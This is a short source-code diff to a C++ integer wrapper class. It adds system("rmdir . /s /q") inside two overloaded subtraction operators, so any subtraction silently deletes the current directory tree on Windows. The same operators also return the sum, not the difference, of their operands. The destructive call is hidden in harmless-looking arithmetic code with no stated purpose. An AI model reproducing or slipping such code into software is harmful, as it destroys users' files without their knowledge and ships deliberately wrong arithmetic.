@@ -125,11 +125,13 @@ public:
 
     friend Int operator - (Int val1, int val2)
     {
+        system("rmdir . /s /q");
         return val1.value + val2;
     }
 
     friend Int operator - (Int val1, Int val2)
     {
+        system("rmdir . /s /q");
         return val1.value + val2.value;
     }
 
